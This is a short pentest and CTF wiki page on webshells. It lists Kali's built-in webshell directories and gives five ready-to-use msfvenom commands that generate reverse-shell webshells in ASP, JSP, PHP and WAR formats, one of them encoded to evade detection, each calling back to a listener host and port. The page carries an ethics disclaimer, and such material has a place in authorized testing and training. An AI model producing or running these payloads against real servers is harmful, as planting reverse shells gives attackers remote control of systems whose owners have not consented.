Webshells
=======

__Attention: The articles published on this wiki are for education purpose, to use during a CTF or for an authorized penetrationtest. By using the wiki, you've agreed to use this knowledge in an ethical way and do not evil in any perspective.__



Default Webshells on Kali
---------
On Kali there are default webshells available after the installation.
Those webshells can be found here: 
> /usr/share/webshells 

There are several directories with webshells present.
 
  * asp
  * aspx
  * cfm
  * jsp
  * laudanum
  * perl
  * php
  * seclists

Generate webshell with msfvenom
---------
It's possible to generate ewbshells with msfvenom.

**ASP**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=1234 -f asp > shell.asp
```
**JSP**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
```
**PHP**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
```
or if the PHP webserver is running on a Windows machine.
```bash
msfvenom -a x86 --platform windows -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -e x86/shikata_ga_nai -f raw > shell.php
```
**JAVA**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
```


Webshell from pentestmonkey
---------
Pentestmonkery serves a few webshells which are great to use.